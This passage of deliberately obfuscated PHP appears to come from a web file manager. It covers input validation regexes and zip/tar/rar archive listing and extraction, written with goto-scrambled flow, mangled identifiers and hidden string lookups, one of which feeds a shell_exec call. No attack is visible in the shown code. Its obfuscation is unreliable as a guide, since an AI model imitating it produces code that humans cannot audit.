$A÷œß…‚[466] => $Då–áù¤˜é[$A÷œß…‚[466]] ? $Då–áù¤˜é[$A÷œß…‚[466]] : $Då–áù¤˜é[$A÷œß…‚[75]]); goto BÂ¹ìäğÒ‘; CÜŠİ¯ÎÃÕ: $A÷œß…‚ =& $_SERVER[‚Ğ°–—î]; $CêÂ¥›™’™ =& $this->task; $CêÂ¥›™’™[$A÷œß…‚[1511]] = $A÷œß…‚[103]; goto c„¨í¢Ç; A¦™ªäğ¨õ: $this->update(); self::log($A÷œß…‚[1513] . json_encode(array($CêÂ¥›™’™, $Då–áù¤˜é))); goto fÑˆîÜ™±‰; fÑˆîÜ™±‰: } public function nameParse($E±Í§ˆÄøí) { goto C‚ĞÉˆõ§; C‚ĞÉˆõ§: $AŒ˜¥îÆªÅ =& $_SERVER[‚Ğ°–—î]; $dù™æÄøÖ¿ =& $this->task; if ($dù™æÄøÖ¿[$AŒ˜¥îÆªÅ[1511]] == $AŒ˜¥îÆªÅ[1041]) { $dù™æÄøÖ¿[$AŒ˜¥îÆªÅ[1511]] = $AŒ˜¥îÆªÅ[301]; $dù™æÄøÖ¿[$AŒ˜¥îÆªÅ[1488]] = 0; $dù™æÄøÖ¿[$AŒ˜¥îÆªÅ[697]] = 0; } goto e“È”··ë½; e“È”··ë½: $c´àîÏåÜ‘ = get_path_this($E±Í§ˆÄøí); if (strstr($c´àîÏåÜ‘, $AŒ˜¥îÆªÅ[91])) { $dù™æÄøÖ¿[$AŒ˜¥îÆªÅ[991]] += 1; $dù™æÄøÖ¿[$AŒ˜¥îÆªÅ[977]] += 1; } $dù™æÄøÖ¿[$AŒ˜¥îÆªÅ[1481]] = $E±Í§ˆÄøí; goto CÎ²ÛÏÆÜ; CÎ²ÛÏÆÜ: $this->update(); goto E¾ï²Ÿ¥Û; E¾ï²Ÿ¥Û: } } goto E¶äì©Å¦; a„¹¶’ƒ£Î: if (!function_exists($_SERVER[‚Ğ°–—î][1877])) { function imagecreatefrombmp($fÔêà¾°ˆ®) { return ImageGdBMP::load($fÔêà¾°ˆ®); } } class Input { public static function getArray($F¼ìï¹±Ä) { goto Fâ•êïóÜº; Fâ•êïóÜº: $a‚Ä¯Ã«Çí =& $_SERVER[‚Ğ°–—î]; global $in; $D‹çãŞŠ‡ = array(); goto E®»É“§‹‚; E®»É“§‹‚: $aÂ¬¼–¨£Ñ = array(); $f„ŒŸÖƒ¬š = LNG($a‚Ä¯Ã«Çí[1878]); foreach ($F¼ìï¹±Ä as $dğáÒšñÌÙ => $c¤è©™¨¬³) { goto b¹¯¹„âŠ; aÁ²Ğƒ›­÷: if (!array_key_exists($dğáÒšñÌÙ, $in)) { if (array_key_exists($a‚Ä¯Ã«Çí[1880], $c¤è©™¨¬³)) { if (!is_null($c¤è©™¨¬³[$a‚Ä¯Ã«Çí[1880]])) { $D‹çãŞŠ‡[$eÎ÷¢®©Í‹] = $c¤è©™¨¬³[$a‚Ä¯Ã«Çí[1880]]; } } else { if (isset($c¤è©™¨¬³[$a‚Ä¯Ã«Çí[1881]])) { $aÂ¬¼–¨£Ñ[] = $fèÄğ‡É†ç; } } continue; } if (isset($c¤è©™¨¬³[$a‚Ä¯Ã«Çí[1881]]) && $c¤è©™¨¬³[$a‚Ä¯Ã«Çí[1881]] == $a‚Ä¯Ã«Çí[282]) { $a´åÉôà±½ = json_decode($in[$dğáÒšñÌÙ], !0); if (is_array($a´åÉôà±½)) { $D‹çãŞŠ‡[$eÎ÷¢®©Í‹] = $a´åÉôà±½; } else { if (array_key_exists($a‚Ä¯Ã«Çí[1880], $c¤è©™¨¬³)) { if (!is_null($c¤è©™¨¬³[$a‚Ä¯Ã«Çí[1880]])) { $D‹çãŞŠ‡[$eÎ÷¢®©Í‹] = $c¤è©™¨¬³[$a‚Ä¯Ã«Çí[1880]]; } } else { $aÂ¬¼–¨£Ñ[] = $fèÄğ‡É†ç; } } continue; } $DÃõ‰áä® = _get($c¤è©™¨¬³, $a‚Ä¯Ã«Çí[1013]); goto BÁ§¾ğ›ë„; BÁ§¾ğ›ë„: if (isset($c¤è©™¨¬³[$a‚Ä¯Ã«Çí[1881]]) && !self::check($in[$dğáÒšñÌÙ], $c¤è©™¨¬³[$a‚Ä¯Ã«Çí[1881]], $DÃõ‰áä®)) { if (array_key_exists($a‚Ä¯Ã«Çí[1880], $c¤è©™¨¬³)) { if (!is_null($c¤è©™¨¬³[$a‚Ä¯Ã«Çí[1880]])) { $D‹çãŞŠ‡[$eÎ÷¢®©Í‹] = $c¤è©™¨¬³[$a‚Ä¯Ã«Çí[1880]]; } } else { $aÂ¬¼–¨£Ñ[] = $fèÄğ‡É†ç; } continue; } $D‹çãŞŠ‡[$eÎ÷¢®©Í‹] = $in[$dğáÒšñÌÙ]; goto DÇ˜Îë³Ğá; b¹¯¹„âŠ: $fèÄğ‡É†ç = _get($c¤è©™¨¬³, $a‚Ä¯Ã«Çí[1246], $f„ŒŸÖƒ¬š . $a‚Ä¯Ã«Çí[881] . $dğáÒšñÌÙ); $eÎ÷¢®©Í‹ = $dğáÒšñÌÙ; if (isset($c¤è©™¨¬³[$a‚Ä¯Ã«Çí[1879]]) && $c¤è©™¨¬³[$a‚Ä¯Ã«Çí[1879]]) { $eÎ÷¢®©Í‹ = $c¤è©™¨¬³[$a‚Ä¯Ã«Çí[1879]]; } goto aÁ²Ğƒ›­÷; DÇ˜Îë³Ğá: } goto d«õ·ÇÆõ; d«õ·ÇÆõ: if (count($aÂ¬¼–¨£Ñ) > 0) { show_json(implode($a‚Ä¯Ã«Çí[1882], $aÂ¬¼–¨£Ñ), !1); } return $D‹çãŞŠ‡; goto FÕ©º…ˆ…¾; FÕ©º…ˆ…¾: } public static function reg($c™ÇéÃĞÑŠ = "\x72\145\161\165\151\162\145") { static $BµÕÙ‚‘œ÷ = array("\x72\x65\161\165\x69\x72\145" => "\x2e\x2b", "\x6e\x75\x6d\x62\x65\162" => "\134\144\53", "\x68\x65\170" => "\x5b\x30\x2d\71\101\55\106\x61\x2d\146\135\53", "\151\156\x74" => "\x5b\x2d\134\x2b\x5d\x3f\x5c\144\x2b", "\x62\x6f\157\x6c" => "\60\174\61", "\146\x6c\x6f\141\x74" => "\133\x2d\134\53\135\77\x5c\144\53\50\x5c\x2e\134\144\53\51\77", "\x65\156\147\x6c\151\x73\150" => "\x5b\x41\x2d\x5a\141\x2d\172\40\x5d\53", "\143\x68\151\156\x65\x73\145" => "\x5b\x5c\170\173\x34\x65\x30\60\x7d\55\x5c\x78\173\71\x66\x61\65\175\135\53", "\x68\141\163\103\150\x69\x6e\145\x73\x65" => "\57\50\x5b\134\x78\173\64\145\x30\x30\x7d\x2d\134\170\173\71\x66\141\65\175\135\53\51\x2f\x75", "\x65\x6d\141\x69\x6c" => "\134\167\53\50\133\134\56\134\x2d\x5d\134\x77\x2b\x29\52\x5c\x40\134\167\x2b\x28\x5b\134\x2e\134\55\135\134\167\53\51\x2a\x5c\x2e\x5c\167\x2b", "\160\x68\x6f\x6e\145" => "\x31\133\x33\55\x39\135\x5c\144\x7b\71\x7d", "\x74\145\x6c\160\x68\157\156\145" => "\50\x5c\x28\x5c\x64\x7b\x33\54\x34\x7d\134\x29\174\x5c\144\x7b\x33\54\64\175\55\x7c\134\x73\51\77\x5c\x64\x7b\67\x2c\x31\64\175", "\165\x72\x6c" => "\50\150\164\164\160\x7c\146\164\x70\x7c\x68\x74\x74\x70\163\51\72\134\57\134\x2f\133\134\x77\x5c\55\x5f\135\53\50\134\56\x5b\x5c\167\x5c\55\x5f\x5d\53\x29\53\50\133\134\167\x5c\x2d\x5c\x2e\54\x40\x3f\136\75\x25\46\x3a\x5c\57\x7e\134\53\x23\135\52\133\134\167\x5c\x2d\134\x40\77\136\75\45\46\x5c\57\176\134\x2b\43\x5d\x29\x3f", "\165\x72\x6c\106\x75\154\154" => "\x5b\141\x2d\x7a\x41\x2d\x7a\135\53\x3a\x5c\57\134\57\x5b\136\134\163\135\x2a", "\x69\x70" => "\50\134\x64\x7b\x31\x2c\x33\175\x5c\x2e\51\173\63\175\x28\134\144\173\x31\54\63\x7d\x29", "\x7a\x69\x70" => "\133\61\x2d\x39\x5d\x5c\x64\x7b\x35\175\50\x3f\x21\x5c\x64\x29", "\x69\x64\103\141\162\x64" => "\x28\x5c\144\173\x31\x35\x7d\51\174\50\134\x64\x7b\x31\x37\175\x28\134\144\174\x58\x7c\170\x29\x29", "\143\157\154\157\x72" => "\43\x28\133\x30\55\x39\101\x2d\106\x61\55\146\x5d\173\x33\175\174\x5b\x30\55\71\x41\55\x46\x61\55\x66\135\x7b\x36\x7d\x29", "\164\x69\155\x65" => "\x28\133\x30\55\x31\x5d\x5c\144\x7c\62\x5b\60\x2d\x34\x5d\51\72\133\60\55\65\135\x5c\x64", "\144\x61\x74\145" => "\x5c\x64\173\x34\175\133\x2d\134\x2f\x5d\x3f\x28\60\x5b\x31\x2d\x39\x5d\174\61\x5b\60\55\62\x5d\x29\x5b\55\134\x2f\x5d\77\50\133\x30\55\62\135\x5c\x64\x7c\x33\133\x30\55\61\135\51", "\144\x61\x74\x65\x54\x69\155\x65" => "\x5c\144\173\64\x7d\133\55\134\x2f\x5d\x3f\x28\60\x5b\x31\55\71\135\x7c\61\x5b\60\55\x32\x5d\x29\133\55\x5c\x2f\135\x3f\50\x5b\x30\x2d\62\135\134\x64\174\63\133\x30\55\x31\x5d\x29\x5c\163\53\50\133\60\x2d\x31\x5d\134\144\x7c\62\x5b\x30\55\64\x5d\51\72\133\60\55\x35\x5d\134\144", "\160\141\x73\163\x77\x6f\x72\144" => "\50\x3f\75\56\52\134\x64\51\50\77\75\56\x2a\133\141\x2d\172\x5d\51\50\x3f\75\56\x2a\133\101\x2d\x5a\x5d\51\x2e\x7b\x38\x2c\62\x30\x7d", "\x6b\x65\171" => "\133\x41\x2d\x5a\x61\x2d\172\x30\x2d\x39\x5f\x5c\x2d\x5c\56\135\x2b", "\x6b\x65\171\106\165\154\154" => "\x5b\x41\55\132\141\x2d\172\x30\55\x39\x5f\x5c\x2d\x5c\x2e\134\x73\54\135\x2b"); if (!$c™ÇéÃĞÑŠ) { return $BµÕÙ‚‘œ÷; } return $BµÕÙ‚‘œ÷[$c™ÇéÃĞÑŠ]; } public static function check($EæÎôã•, $c­¸ìÓöâ°, $F²’»•¥ïè = null) { $B²¢ÈÕ’ò· =& $_SERVER[‚Ğ°–—î]; switch ($c­¸ìÓöâ°) { case $B²¢ÈÕ’ò·[7]: return in_array($EæÎôã•, $F²’»•¥ïè); break; case $B²¢ÈÕ’ò·[1883]: return floatval($EæÎôã•) > $F²’»•¥ïè; break; case $B²¢ÈÕ’ò·[1884]: return floatval($EæÎôã•) < $F²’»•¥ïè; break; case $B²¢ÈÕ’ò·[325]: return strlen($EæÎôã•) >= $F²’»•¥ïè[0] && strlen($EæÎôã•) <= $F²’»•¥ïè[1]; break; case $B²¢ÈÕ’ò·[325]: if (is_array($F²’»•¥ïè)) { return strlen($EæÎôã•) >= $F²’»•¥ïè[0] && strlen($EæÎôã•) <= $F²’»•¥ïè[1]; break; } else { return strlen($EæÎôã•) == $F²’»•¥ïè; break; } case $B²¢ÈÕ’ò·[321]: return floatval($EæÎôã•) >= $F²’»•¥ïè[0] && floatval($EæÎôã•) <= $F²’»•¥ïè[1]; break; } $a¯áÎÑÎùˆ = self::reg(!1); $c­¸ìÓöâ° = isset($a¯áÎÑÎùˆ[$c­¸ìÓöâ°]) ? $a¯áÎÑÎùˆ[$c­¸ìÓöâ°] : $c­¸ìÓöâ°; if (substr($c­¸ìÓöâ°, 0, 1) != $B²¢ÈÕ’ò·[8]) { $c­¸ìÓöâ° = $B²¢ÈÕ’ò·[1885] . $c­¸ìÓöâ° . $B²¢ÈÕ’ò·[1886]; } return preg_match($c­¸ìÓöâ°, $EæÎôã•) === 1; } public static function get($D¿Ü°Ò¼¸‘, $A¹Ş¢î¥ç = null, $eïãÀ²ƒÓã = null, $fïÙ õÏø = null) { goto AÚœƒõÔè†; c¶ŒÌÙÅ¤ö: return $A…ÀéêÌğ[$D¿Ü°Ò¼¸‘]; goto Câ‹â­ÛÆ; AÚœƒõÔè†: $a³Ú†ä¤ =& $_SERVER[‚Ğ°–—î]; $bØ¢¶ö¬ø‚ = array(); if (!is_null($eïãÀ²ƒÓã)) { $bØ¢¶ö¬ø‚[$a³Ú†ä¤[34]] = $eïãÀ²ƒÓã; } goto B¼ªª²˜Î ; B¼ªª²˜Î : if (!is_null($fïÙ õÏø)) { $bØ¢¶ö¬ø‚[$a³Ú†ä¤[1013]] = $fïÙ õÏø; } if (!is_null($A¹Ş¢î¥ç)) { $bØ¢¶ö¬ø‚[$a³Ú†ä¤[1881]] = $A¹Ş¢î¥ç; } $A…ÀéêÌğ = Input::getArray(array($D¿Ü°Ò¼¸‘ => $bØ¢¶ö¬ø‚)); goto c¶ŒÌÙÅ¤ö; Câ‹â­ÛÆ: } } class KodArchive { static function init() { goto d©‚ÓƒÁ; cááÆéªŸÂ: define($d¥Êò‘Á¸[1889], TEMP_FILES); define($d¥Êò‘Á¸[1890], TEMP_FILES); define($d¥Êò‘Á¸[1891], $d¥Êò‘Á¸[1892]); goto c­éğÒô‚; d©‚ÓƒÁ: $d¥Êò‘Á¸ =& $_SERVER[‚Ğ°–—î]; if (defined($d¥Êò‘Á¸[1887])) { return; } define($d¥Êò‘Á¸[1887], SDK_DIR . $d¥Êò‘Á¸[1888]); goto cááÆéªŸÂ; c­éğÒô‚: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $d¥Êò‘Á¸[1893]; require_once ARCHIVE_LIB . $d¥Êò‘Á¸[1894]; goto dÍ§¤ØÎ†¹; dÍ§¤ØÎ†¹: require_once ARCHIVE_LIB . $d¥Êò‘Á¸[1895]; require_once ARCHIVE_LIB . $d¥Êò‘Á¸[1896]; require_once ARCHIVE_LIB . $d¥Êò‘Á¸[1897]; goto Cº×®ÛµèÏ; Cº×®ÛµèÏ: require_once ARCHIVE_LIB . $d¥Êò‘Á¸[1898]; goto bÉÔÁ ‡Ò; bÉÔÁ ‡Ò: } static function checkIfType($D·åàÆí‰ä, $B‘¹æ£Ë) { goto bÛñò¸²¶; f™†£İì—: $C‡¨®¾É’ = in_array($D·åàÆí‰ä, $bÑÜÒˆëî[$B‘¹æ£Ë]); if ($C‡¨®¾É’ && ($B‘¹æ£Ë == $fÃÙù–ñŠ¸[301] || $B‘¹æ£Ë == $fÃÙù–ñŠ¸[1902]) && (!function_exists($fÃÙù–ñŠ¸[1910]) || !function_exists($fÃÙù–ñŠ¸[1911]))) { show_tips($fÃÙù–ñŠ¸[1912]); } if ($C‡¨®¾É’ && $B‘¹æ£Ë == $fÃÙù–ñŠ¸[1046] && (!function_exists($fÃÙù–ñŠ¸[1913]) || !strstr(shell_exec($fÃÙù–ñŠ¸[1914]), $fÃÙù–ñŠ¸[1915]))) { show_tips($fÃÙù–ñŠ¸[1916]); } goto BÕœ«•‡“å; bÛñò¸²¶: $fÃÙù–ñŠ¸ =& $_SERVER[‚Ğ°–—î]; self::init(); $bÑÜÒˆëî = array($fÃÙù–ñŠ¸[301] => array($fÃÙù–ñŠ¸[301], $fÃÙù–ñŠ¸[1899], $fÃÙù–ñŠ¸[1900], $fÃÙù–ñŠ¸[1901]), $fÃÙù–ñŠ¸[1902] => array($fÃÙù–ñŠ¸[1902], $fÃÙù–ñŠ¸[1903], $fÃÙù–ñŠ¸[1044], $fÃÙù–ñŠ¸[1042]), $fÃÙù–ñŠ¸[1046] => array($fÃÙù–ñŠ¸[1046], $fÃÙù–ñŠ¸[1904], $fÃÙù–ñŠ¸[1905], $fÃÙù–ñŠ¸[1906], $fÃÙù–ñŠ¸[1907], $fÃÙù–ñŠ¸[1908], $fÃÙù–ñŠ¸[1909])); goto f™†£İì—; BÕœ«•‡“å: return $C‡¨®¾É’; goto Bç³ø¼Æ‘…; Bç³ø¼Æ‘…: } static function listContent($Bø‰åäç»š, $Aùƒ«ƒåï¼ = true) { $a‡ÙİÇÑ¯ =& $_SERVER[‚Ğ°–—î]; self::init(); $e¿Å¢æÙ¶¤ = !empty($GLOBALS[$a‡ÙİÇÑ¯[1050]]) ? $GLOBALS[$a‡ÙİÇÑ¯[1050]] : get_path_ext($Bø‰åäç»š); $AŸ¥¬¸Ãº  = !1; if (self::checkIfType($e¿Å¢æÙ¶¤, $a‡ÙİÇÑ¯[1902])) { $Aæ¡Ÿ¥Éƒ£ = PclTarList($Bø‰åäç»š, $e¿Å¢æÙ¶¤); $AŸ¥¬¸Ãº  = array(); for ($F¶¥ĞÕĞáê = 0; $F¶¥ĞÕĞáê < count($Aæ¡Ÿ¥Éƒ£); $F¶¥ĞÕĞáê++) { $a”ÆÆ„áÙ = $Aæ¡Ÿ¥Éƒ£[$F¶¥ĞÕĞáê]; if ($a”ÆÆ„áÙ[$a‡ÙİÇÑ¯[1917]] == $a‡ÙİÇÑ¯[1918] || $a”ÆÆ„áÙ[$a‡ÙİÇÑ¯[1917]] == $a‡ÙİÇÑ¯[1919]) { continue; } if ($Aùƒ«ƒåï¼) { $a”ÆÆ„áÙ[$a‡ÙİÇÑ¯[1920]] = ltrim($a”ÆÆ„áÙ[$a‡ÙİÇÑ¯[1920]], $a‡ÙİÇÑ¯[1155]); } if ($a”ÆÆ„áÙ[$a‡ÙİÇÑ¯[1917]] == $a‡ÙİÇÑ¯[1921]) { $a”ÆÆ„áÙ[$a‡ÙİÇÑ¯[76]] = !0; } else { $a”ÆÆ„áÙ[$a‡ÙİÇÑ¯[76]] = !1; } $a”ÆÆ„áÙ[$a‡ÙİÇÑ¯[1037]] = $F¶¥ĞÕĞáê; $AŸ¥¬¸Ãº [] = $a”ÆÆ„áÙ; } } else { if (self::checkIfType($e¿Å¢æÙ¶¤, $a‡ÙİÇÑ¯[1046])) { $d§Ö¢Ä†Şš = kodRarArchive::listContent($Bø‰åäç»š); if (!$d§Ö¢Ä†Şš[$a‡ÙİÇÑ¯[1033]]) { return $d§Ö¢Ä†Şš; } else { $AŸ¥¬¸Ãº  = $d§Ö¢Ä†Şš[$a‡ÙİÇÑ¯[1035]]; } } else { if (kodZipArchive::support($a‡ÙİÇÑ¯[354])) { $AŸ¥¬¸Ãº  = kodZipArchive::listContent($Bø‰åäç»š); } else { $FÅ½¡óÅÌ = new PclZip($Bø‰åäç»š); $AŸ¥¬¸Ãº  = $FÅ½¡óÅÌ->listContent(); } } } if ($AŸ¥¬¸Ãº ) { $d–öéÕ÷µ = unzip_charset_get($AŸ¥¬¸Ãº ); $Aùƒ«ƒåï¼ = $Aùƒ«ƒåï¼ && function_exists($a‡ÙİÇÑ¯[65]); for ($F¶¥ĞÕĞáê = 0; $F¶¥ĞÕĞáê < count($AŸ¥¬¸Ãº ); $F¶¥ĞÕĞáê++) { $AŸ¥¬¸Ãº [$F¶¥ĞÕĞáê][$a‡ÙİÇÑ¯[1920]] = str_replace(array($a‡ÙİÇÑ¯[1073], $a‡ÙİÇÑ¯[1922]), $a‡ÙİÇÑ¯[763], $AŸ¥¬¸Ãº [$F¶¥ĞÕĞáê][$a‡ÙİÇÑ¯[1920]]); if ($Aùƒ«ƒåï¼) { $AŸ¥¬¸Ãº [$F¶¥ĞÕĞáê][$a‡ÙİÇÑ¯[1920]] = iconv_to($AŸ¥¬¸Ãº [$F¶¥ĞÕĞáê][$a‡ÙİÇÑ¯[1920]], $d–öéÕ÷µ, $a‡ÙİÇÑ¯[326]); unset($AŸ¥¬¸Ãº [$F¶¥ĞÕĞáê][$a‡ÙİÇÑ¯[1923]]); } } return array($a‡ÙİÇÑ¯[1033] => !0, $a‡ÙİÇÑ¯[1035] => $AŸ¥¬¸Ãº ); } else { return array($a‡ÙİÇÑ¯[1033] => !1, $a‡ÙİÇÑ¯[1035] => $AŸ¥¬¸Ãº ); } } static function extract($Cá‘¶Ù×ã, $cÒºáÎßÇˆ, $Aù´¯é‰„á = "\x2d\x31", &$e ˜çª×• = false) { goto Eœš™Å½¹; b¯ë¼ˆ‡æº: if (self::checkIfType($f®øñŸ‹°Ä, $AÚóŠÆâ†[1902])) { if ($Aù´¯é‰„á != $AÚóŠÆâ†[1032]) { $bìÊÕéŠ§ = unzip_pre_name($bìÊÕéŠ§); $A¡ÏÉÜ»ë½ = unzip_pre_name($A¡ÏÉÜ»ë½); $bİ’ÉŒæœ„ = PclTarExtractList($Cá‘¶Ù×ã, array($bìÊÕéŠ§), $cÒºáÎßÇˆ, $A¡ÏÉÜ»ë½, $f®øñŸ‹°Ä); } else { $bİ’ÉŒæœ„ = PclTarExtract($Cá‘¶Ù×ã, $cÒºáÎßÇˆ, $AÚóŠÆâ†[361], $f®øñŸ‹°Ä); } return array($AÚóŠÆâ†[1033] => $bİ’ÉŒæœ„, $AÚóŠÆâ†[1035] => PclErrorString(!0)); } else { if (self::checkIfType($f®øñŸ‹°Ä, $AÚóŠÆâ†[1046])) { return kodRarArchive::extract($Cá‘¶Ù×ã, $cÒºáÎßÇˆ, $f®øñŸ‹°Ä, $e ˜çª×•); } else { if (kodZipArchive::support($AÚóŠÆâ†[1924])) { return kodZipArchive::extract($Cá‘¶Ù×ã, $cÒºáÎßÇˆ, $e ˜çª×•); } else { $a¤Å×ñ¥ó‡ = new PclZip($Cá‘¶Ù×ã); if ($Aù´¯é‰„á != $AÚóŠÆâ†[1032]) { $bİ’ÉŒæœ„ = $a¤Å×ñ¥ó‡->extract(PCLZIP_OPT_PATH, $cÒºáÎßÇˆ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $AÚóŠÆâ†[1925], PCLZIP_OPT_BY_NAME, $cÜïÄº â[$AÚóŠÆâ†[1920]], PCLZIP_OPT_REMOVE_PATH, $A¡ÏÉÜ»ë½, PCLZIP_OPT_REPLACE_NEWER); } else { $bİ’ÉŒæœ„ = $a¤Å×ñ¥ó‡->extract(PCLZIP_OPT_PATH, $cÒºáÎßÇˆ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $AÚóŠÆâ†[1925], PCLZIP_OPT_REPLACE_NEWER); } return array($AÚóŠÆâ†[1033] => $bİ’ÉŒæœ„, $AÚóŠÆâ†[1035] => $a¤Å×ñ¥ó‡->errorName(!0)); } } } return array($AÚóŠÆâ†[1033] => !1, $AÚóŠÆâ†[1035] => $AÚóŠÆâ†[1926]); goto bì¿ïÔè; Eœš™Å½¹: $AÚóŠÆâ† =& $_SERVER[‚Ğ°–—î]; self::init(); $f®øñŸ‹°Ä = !empty($GLOBALS[$AÚóŠÆâ†[1050]]) ? $GLOBALS[$AÚóŠÆâ†[1050]] : get_path_ext($Cá‘¶Ù×ã); goto a™Ş§Ê¶Ò; a™Ş§Ê¶Ò: $A ÓÈÍ“ÕÏ = self::listContent($Cá‘¶Ù×ã, !1); if (!$A ÓÈÍ“ÕÏ[$AÚóŠÆâ†[1033]]) { return $A ÓÈÍ“ÕÏ; } if ($Aù´¯é‰„á != $AÚóŠÆâ†[1032]) { goto fßÂÕàŒÌÌ; aÂÍ‚•êéç: if ($GLOBALS[$AÚóŠÆâ†[6]][$AÚóŠÆâ†[1153]] != $AÚóŠÆâ†[326]) { $bìÊÕéŠ§ = unzip_pre_name($e ˜çª×•); } $A¡ÏÉÜ»ë½ = get_path_father($e ˜çª×•); if ($A¡ÏÉÜ»ë½ == $e ˜çª×•) { $A¡ÏÉÜ»ë½ = $AÚóŠÆâ†[33]; } goto dÓ­‹•÷°³; dÓ­‹•÷°³: if ($cÜïÄº â[$AÚóŠÆâ†[76]]) { $bìÊÕéŠ§ = rtrim($bìÊÕéŠ§, $AÚóŠÆâ†[8]) . $AÚóŠÆâ†[8]; $e ˜çª×• = array($e ˜çª×•); } $e¿Œšº© = str_replace($AÚóŠÆâ†[93], $AÚóŠÆâ†[8], $bìÊÕéŠ§); if (substr($e¿Œšº©, -1) == $AÚóŠÆâ†[8]) { if (!strstr(trim($e¿Œšº©, $AÚóŠÆâ†[8]), $AÚóŠÆâ†[8])) { $cÒºáÎßÇˆ = $cÒºáÎßÇˆ . get_path_this($e¿Œšº©) . $AÚóŠÆâ†[8]; } } else { if ($A¡ÏÉÜ»ë½ == $bìÊÕéŠ§) { $A¡ÏÉÜ»ë½ = $AÚóŠÆâ†[33]; } } goto cŠöÇõÖ Ì; fßÂÕàŒÌÌ: $cÜïÄº â = self::fileIndex($A ÓÈÍ“ÕÏ[$AÚóŠÆâ†[1035]], $Aù´¯é‰„á); $e ˜çª×• = str_replace(array($AÚóŠÆâ†[1073], $AÚóŠÆâ†[1922]), $AÚóŠÆâ†[70], $cÜïÄº â[$AÚóŠÆâ†[1920]]); $bìÊÕéŠ§ = $e ˜çª×•; goto aÂÍ‚•êéç; cŠöÇõÖ Ì: } goto b¯ë¼ˆ‡æº; bì¿ïÔè: } static function fileIndex($Eºã‡Ğö„, $E½ˆçÍóË, $C«”ÃÒ‘ôï = false) { goto bâÃë•›Šæ; bâÃë•›Šæ: $aï£ŒÊÀùô =& $_SERVER[‚Ğ°–—î]; self::init(); if (!is_array($Eºã‡Ğö„)) { return !1; } goto fˆÒÔÑì•Œ; F—‘ñÅÓ”‡: $BåĞ ®ÍÓö = $A ‘Ó”« ; if ($C«”ÃÒ‘ôï) { $BåĞ ®ÍÓö = $A ‘Ó”« [$C«”ÃÒ‘ôï]; if ($A ‘Ó”« [$aï£ŒÊÀùô[76]]) { $BåĞ ®ÍÓö = rtrim($BåĞ ®ÍÓö, $aï£ŒÊÀùô[8]) . $aï£ŒÊÀùô[8]; } } return $BåĞ ®ÍÓö; goto c§£Ôˆ·¹¼; fˆÒÔÑì•Œ: $fçÅ˜Éš = count($Eºã‡Ğö„); for ($b‚ùß”§¶ = 0; $b‚ùß”§¶ < $fçÅ˜Éš; $b‚ùß”§¶++) { if ($E½ˆçÍóË == $Eºã‡Ğö„[$b‚ùß”§¶][$aï£ŒÊÀùô[1037]]) { $A ‘Ó”«  = $Eºã‡Ğö„[$b‚ùß”§¶]; break; } } if (!$A ‘Ó”« ) { show_tips($aï£ŒÊÀùô[1927]); } goto F—‘ñÅÓ”‡; c§£Ôˆ·¹¼: } static function extractZipFile($AèÉÔ‘¢í, $C‡¬•Ò‹§Ñ, $CëŠù¬†Øœ = false) { goto aÁ¨¸ëñáÂ; CòÁ‚À¦Áø: if (!file_exists($aÊ¾¨§‘òç)) { return !1; } @rename($aÊ¾¨§‘òç, $aù…ğ“ƒÍİ); return $aù…ğ“ƒÍİ; goto eÙÕì˜Ø¤²; aÁ¨¸ëñáÂ: $CÛ îŒ¡Ëø =& $_SERVER[‚Ğ°–—î]; self::init(); $F„Èæ±– = TEMP_FILES . hash_path($AèÉÔ‘¢í) . $CÛ îŒ¡Ëø[8]; goto c„µÅÌ•à¹; BˆÚßÃÓŞ­: $CöÙÒÓÅ« = get_path_father($C‡¬•Ò‹§Ñ); if ($CöÙÒÓÅ« == $C‡¬•Ò‹§Ñ) { $CöÙÒÓÅ« = $CÛ îŒ¡Ëø[33]; } $FÒ“î•Õ†÷ = $bÚÙœ¿Õ™->extract(PCLZIP_OPT_PATH, $F„Èæ±–, PCLZIP_CB_PRE_FILE_NAME, $CÛ îŒ¡Ëø[1925], PCLZIP_OPT_REMOVE_PATH, $CöÙÒÓÅ«, PCLZIP_OPT_BY_NAME, $C‡¬•Ò‹§Ñ); goto CòÁ‚À¦Áø; c„µÅÌ•à¹: mk_dir($F„Èæ±–); $aù…ğ“ƒÍİ = $F„Èæ±– . md5($AèÉÔ‘¢í . $C‡¬•Ò‹§Ñ); if ($CëŠù¬†Øœ) { $aù…ğ“ƒÍİ = $F„Èæ±– . $CëŠù¬†Øœ; } goto dçæïœÀ‚è; dçæïœÀ‚è: if (file_exists($aù…ğ“ƒÍİ)) { return $aù…ğ“ƒÍİ; } $bÚÙœ¿Õ™ = new PclZip($AèÉÔ‘¢í); $aÊ¾¨§‘òç = unzip_filter_ext($F„Èæ±– . get_path_this($C‡¬•Ò‹§Ñ)); goto BˆÚßÃÓŞ­; eÙÕì˜Ø¤²: } static function filePreview($f«Ô‡¡…¿, $dä´ÃõÇ³ƒ, $cÔÒ¼·¥ˆ = false, $a‘¿îŠ“È = false) { goto e´·Ëêãóœ; b”¥¶À²×: mk_dir($CÆõ„“İ¹»); $FÊ»šŸ¹¸Î = $CÆõ„“İ¹» . md5($f«Ô‡¡…¿ . $dä´ÃõÇ³ƒ . $a‘¿îŠ“È); $b– ¯ÅîÉ = $bá¶†ÛŞÙ[33]; goto aìÌÂ‘ƒòï; aìÌÂ‘ƒòï: $DË¼àŸœ† = self::extract($f«Ô‡¡…¿, $CÆõ„“İ¹», $dä´ÃõÇ³ƒ, $b– ¯ÅîÉ); if (is_array($b– ¯ÅîÉ)) { show_json($bá¶†ÛŞÙ[1928], !1); } if (file_exists($FÊ»šŸ¹¸Î)) { IO::fileOut($FÊ»šŸ¹¸Î, $cÔÒ¼·¥ˆ, get_path_this($b– ¯ÅîÉ)); return; } goto D‡ÏİÛ÷ñ‰; CºÇµ‰ºˆ: if (!file_exists($FÊ»šŸ¹¸Î)) { del_dir($CÆõ„“İ¹»); show_json($bá¶†ÛŞÙ[1930]); } IO::fileOut($FÊ»šŸ¹¸Î, $cÔÒ¼·¥ˆ, $b®Ê®±Ó“); goto B®İØÎ‘åê; föÃ‹ÚÙ“Ö: if (!$DË¼àŸœ†[$bá¶†ÛŞÙ[1033]]) { show_json($DË¼àŸœ†[$bá¶†ÛŞÙ[1035]], !1); } if (!file_exists($a‘²î•ëœÕ)) { show_json($bá¶†ÛŞÙ[1929], !1); } @rename($a‘²î•ëœÕ, 